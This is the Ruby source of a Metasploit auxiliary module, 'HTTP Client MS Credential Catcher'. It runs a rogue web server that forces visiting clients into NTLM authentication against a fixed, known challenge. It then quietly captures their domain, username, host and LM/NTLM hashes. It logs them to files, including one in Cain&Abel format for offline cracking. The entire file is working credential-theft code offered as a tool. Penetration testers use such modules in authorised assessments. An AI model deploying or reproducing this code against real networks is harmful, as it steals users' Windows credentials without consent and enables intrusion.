##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

require 'rex/proto/ntlm/constants'

NTLM_CONST = Rex::Proto::NTLM::Constants

require 'rex/proto/ntlm/message'
MESSAGE = Rex::Proto::NTLM::Message

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'HTTP Client MS Credential Catcher',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module attempts to quietly catch NTLM/LM Challenge hashes.
				},
			'Author'      =>
				[
					'Ryan Linn <sussurro[at]happypacket.net>',
				],
			'Version'     => '$Revision$',
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'WebServer' ]
				],
			'PassiveActions' =>
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptString.new('LOGFILE', [ false, "The local filename to store the captured hashes", nil ]),
			OptString.new('PWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ])

		], self.class)

		register_advanced_options([
			OptString.new('DOMAIN',  [ false, "The default domain to use for NTLM authentication", "DOMAIN"]),
			OptString.new('SERVER',  [ false, "The default server to use for NTLM authentication", "SERVER"]),
			OptString.new('DNSNAME',  [ false, "The default DNS server name to use for NTLM authentication", "SERVER"]),
			OptString.new('DNSDOMAIN',  [ false, "The default DNS domain name to use for NTLM authentication", "example.com"]),
			OptBool.new('FORCEDEFAULT',  [ false, "Force the default settings", false])
		], self.class)

		@challenge = "\x11\x22\x33\x44\x55\x66\x77\x88"

	end

	def on_request_uri(cli, request)
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		# If the host has not started auth, send 401 authenticate with only the NTLM option
		if(!request.headers['Authorization'])
			response = create_response(401, "Unauthorized")
			response.headers['WWW-Authenticate'] = "NTLM"
			cli.send_response(response)
		else
			method,hash = request.headers['Authorization'].split(/\s+/,2)
			# If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
			if(method != "NTLM")
				print_status("Unrecognized Authorization header, responding with 404")
				send_not_found(cli)
				return false
			end

			response = handle_auth(cli,hash)
			cli.send_response(response)
		end
	end

	def run
		exploit()
	end

	def handle_auth(cli,hash)
		#authorization string is base64 encoded message
		message = Rex::Text.decode_base64(hash)

		if(message[8,1] == "\x01")
			domain = datastore['DOMAIN']
			server = datastore['SERVER']
			dnsname = datastore['DNSNAME']
			dnsdomain = datastore['DNSDOMAIN']

			if(!datastore['FORCEDEFAULT'])
				dom,ws = parse_type1_domain(message)
				if(dom)
					domain = dom
				end
				if(ws)
					server = ws
				end
			end

			response = create_response(401, "Unauthorized")
			chalhash = MESSAGE.process_type1_message(hash,@challenge,domain,server,dnsname,dnsdomain)
			response.headers['WWW-Authenticate'] = "NTLM " + chalhash
			return response

		#if the message is a type 3 message, then we have our creds
		elsif(message[8,1] == "\x03")
			domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)
			print_status("#{cli.peerhost}: #{domain}\\#{user} #{lm_hash}:#{ntlm_hash} on #{host}")

			if(datastore['LOGFILE'])
				fd = File.open(datastore['LOGFILE'], "ab")
				fd.puts(
					[
						Time.now.to_s,
						cli.peerhost,
						host,
						domain ? domain : "<NULL>",
						user ? user : "<NULL>",
						lm_hash ? lm_hash : "<NULL>",
						ntlm_hash ? ntlm_hash : "<NULL>"
					].join(":").gsub(/\n/, "\\n")
				)
				fd.close
			end

			if(datastore['PWFILE'] and user and lm_hash)
				fd = File.open(datastore['PWFILE'], "ab+")
				fd.puts(
					[
						user,
						domain ? domain : "NULL",
						@challenge.unpack("H*")[0],
						lm_hash ? lm_hash : "0" * 32,
						ntlm_hash ? ntlm_hash : "0" * 32
					].join(":").gsub(/\n/, "\\n")
				)
				fd.close

			end
			response = create_response(200)
			return response
		else
			response = create_response(200)
			return response
		end

	end

	def parse_type1_domain(message)
		domain = nil
		workstation = nil

		reqflags = message[12,4]
		reqflags = reqflags.unpack("V").first

		if((reqflags & NTLM_CONST::NEGOTIATE_DOMAIN) == NTLM_CONST::NEGOTIATE_DOMAIN)
			dom_len = message[16,2].unpack('v')[0].to_i
			dom_off = message[20,2].unpack('v')[0].to_i
			domain = message[dom_off,dom_len].to_s
		end
		if((reqflags & NTLM_CONST::NEGOTIATE_WORKSTATION) == NTLM_CONST::NEGOTIATE_WORKSTATION)
			wor_len = message[24,2].unpack('v')[0].to_i
			wor_off = message[28,2].unpack('v')[0].to_i
			workstation = message[wor_off,wor_len].to_s
		end
		return domain,workstation

	end

end
